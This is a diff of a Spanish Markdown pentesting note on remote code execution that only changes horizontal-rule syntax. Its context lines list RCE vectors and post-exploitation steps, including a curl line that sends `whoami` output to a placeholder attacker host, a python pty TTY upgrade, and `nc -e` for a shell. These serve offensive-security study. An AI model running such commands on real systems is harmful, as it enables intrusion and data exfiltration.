@@ -17,13 +17,13 @@ linked:
 > [!info]
 > **RCE** = ejecución de código arbitrario en sistema remoto. Una de las vulnerabilidades de mayor impacto: compromete confidencialidad, integridad y disponibilidad del target.
 
-***
+---
 
 ## Resumen
 
 Vector de explotación que permite ejecutar comandos/código en el servidor objetivo desde el atacante. Resultado típico: shell interactivo, persistencia, lateral movement.
 
-***
+---
 
 ## Vectores comunes
 
@@ -39,7 +39,7 @@ Vector de explotación que permite ejecutar comandos/código en el servidor obje
 | **CVE público** | Exploits específicos (Log4Shell, Confluence, etc.) | searchsploit, ExploitDB |
 | **SSRF → metadata → RCE** | Cloud metadata leak con permisos | [[SSRF - Cloud Metadata]] |
 
-***
+---
 
 ## Detección post-exploit
 
@@ -48,7 +48,7 @@ Vector de explotación que permite ejecutar comandos/código en el servidor obje
 - Path / privs: `pwd`, `sudo -l`
 - Outbound conn check: `curl http://attacker/?$(whoami)`
 
-***
+---
 
 ## Estabilización
 
@@ -56,7 +56,7 @@ Vector de explotación que permite ejecutar comandos/código en el servidor obje
 - TTY upgrade: `python -c 'import pty;pty.spawn("/bin/bash")'`
 - Stable shell: `socat`, `nc -e`, [[Pivoting & Port Forwarding]]
 
-***
+---
 
 ## Notas Relacionadas
 
